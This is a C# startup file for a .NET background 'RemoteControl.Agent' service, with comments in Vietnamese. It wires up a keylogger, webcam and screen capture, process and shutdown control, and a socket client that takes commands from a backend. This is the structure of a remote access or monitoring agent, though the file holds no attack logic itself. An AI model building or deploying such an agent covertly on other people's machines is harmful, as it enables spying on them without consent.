using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using RemoteControl.Agent; // Namespace của project
using RemoteControl.Agent.Services.Input;
using RemoteControl.Agent.Services.Media;
using RemoteControl.Agent.Services.Networking;
using RemoteControl.Agent.Services.System;

// Tạo builder cho ứng dụng chạy ngầm (Worker Service)
IHost host = Host.CreateDefaultBuilder(args)
    .ConfigureServices(services =>
    {
        services.AddSingleton<PowerHandler>();      // Cho Shutdown/Restart
        services.AddSingleton<Keylogger>();        // Cho Keylogger
        services.AddSingleton<WebcamHandler>();    // Cho Webcam

        // 1. Đăng ký các Service xử lý chức năng (Logic cốt lõi)
        // Singleton: Chỉ tạo 1 bản duy nhất trong suốt vòng đời ứng dụng
        services.AddSingleton<ProcessHandler>(); // Xử lý App/Process
        services.AddSingleton<PowerHandler>();   // Xử lý Shutdown/Restart
        services.AddSingleton<ScreenCapturer>(); // Xử lý Chụp màn hình
        services.AddSingleton<WebcamHandler>();  // Xử lý Webcam
        services.AddSingleton<Keylogger>();      // Xử lý Keylog

        // 2. Đăng ký Service kết nối mạng (SocketClient)
        // Đây là cầu nối để nhận lệnh từ Backend
        services.AddSingleton<SocketClient>();

        // 3. Đăng ký Worker chính (Vòng lặp chạy ngầm)
        // Worker sẽ là người gọi SocketClient để bắt đầu kết nối
        services.AddHostedService<Worker>();
    })
    .Build();

// Chạy ứng dụng
await host.RunAsync();
